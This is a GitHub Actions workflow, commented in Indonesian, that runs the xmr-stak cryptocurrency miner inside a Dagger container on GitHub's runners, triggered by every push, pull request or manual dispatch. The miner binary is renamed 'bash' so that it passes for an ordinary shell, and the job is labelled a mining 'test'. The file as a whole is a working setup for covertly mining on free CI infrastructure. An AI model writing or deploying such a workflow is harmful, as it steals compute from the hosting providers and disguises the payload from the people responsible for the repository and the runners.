name: Dagger - Run xmr-stak (renamed as bash)

on:
  push:
    branches:
      - main
  pull_request:
  workflow_dispatch:

jobs:
  mine-test:
    runs-on: ubuntu-latest
    name: Test mining dengan xmr-stak via Dagger Cloud
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Debug files & permissions
        run: |
          pwd
          ls -la
          ls -la bash || echo "File bash (xmr-stak) tidak ditemukan!"
          file bash || echo "Tidak bisa cek tipe file"
          chmod +x bash  # biar aman kalau belum executable

      - name: Run xmr-stak (bash) dengan --noTest di background (timeout 5 menit test)
        uses: dagger/dagger-for-github@v8.2.0
        with:
          version: latest
          shell: >-
            container
            | from ubuntu:24.04
            | with-workdir /src
            | with-mounted-directory /src .
            | with-exec chmod u+x bash   # pastikan executable
            | with-exec sh -c "./bash --noTest"
            | stdout
          cloud-token: ${{ secrets.DAGGER_CLOUD_TOKEN }}
          debug: true
